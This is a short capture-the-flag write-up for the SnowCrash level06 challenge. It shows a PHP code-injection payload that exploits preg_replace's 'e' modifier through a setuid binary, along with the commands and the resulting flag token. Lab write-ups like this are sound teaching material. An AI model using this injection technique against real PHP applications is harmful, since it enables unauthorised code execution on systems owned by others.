## 1. Connect to level06:

```bash
level05@SnowCrash:~$ su level06
password: *use previously found flag*
```

## 2. See existing files:

```bash
level06@SnowCrash:~$ ls -l
    total 12
	-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

## 3. Seef ile content

```bash
level06@SnowCrash:~$ cat level06.php
```

## 4. Use [PHP Beautifier](https://codebeautify.org/php-beautifier) to make the content readable

The `e` modifier allows arbitrary execution of PHP code. This can lead to **code injection vulnerabilities** if the input is not properly secured.


## 5. Make code injection

Create file for code injection
```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag.txt
```

Execute the binary file with the file you have created
```bash
level06@SnowCrash:~$ ./level06 /tmp/getflag.txt
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	 in /home/user/level06/level06.php(4) : regexp code on line 1
```